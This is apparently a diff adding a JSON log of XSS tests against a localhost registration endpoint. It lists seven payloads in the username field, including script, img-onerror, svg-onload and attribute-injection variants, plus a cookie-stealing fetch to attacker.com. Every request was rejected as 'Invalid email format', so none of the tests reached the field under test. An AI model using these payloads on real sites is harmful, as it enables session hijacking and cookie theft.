@@ -1,0 +1,100 @@
+[
+  {
+    "timestamp": "2026-05-09T10:13:28.310374Z",
+    "type": "XSS",
+    "payload_name": "Script tag basique",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "<script>alert('XSS')</script>",
+      "email": "xss1@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-05-09T10:13:28.359137Z",
+    "type": "XSS",
+    "payload_name": "Image onerror",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "<img src=x onerror=alert(document.cookie)>",
+      "email": "xss2@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-05-09T10:13:28.396951Z",
+    "type": "XSS",
+    "payload_name": "SVG onload",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "<svg onload=alert('XSS')>",
+      "email": "xss3@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-05-09T10:13:28.431418Z",
+    "type": "XSS",
+    "payload_name": "JavaScript URI",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "javascript:alert('XSS')",
+      "email": "xss4@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-05-09T10:13:28.463797Z",
+    "type": "XSS",
+    "payload_name": "Event handler",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "\" onmouseover=\"alert('XSS')",
+      "email": "xss5@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-05-09T10:13:28.499003Z",
+    "type": "XSS",
+    "payload_name": "Balises imbriquees",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+      "email": "xss6@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  },
+  {
+    "timestamp": "2026-05-09T10:13:28.532195Z",
+    "type": "XSS",
+    "payload_name": "Vol de cookie simulé",
+    "url": "http://localhost:8000/users/register",
+    "payload_sent": {
+      "username": "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
+      "email": "xss7@test.com",
+      "password": "password123"
+    },
+    "http_status": 400,
+    "response": "{\"error\":\"Invalid email format\"}\n",
+    "reflected": false
+  }
+]
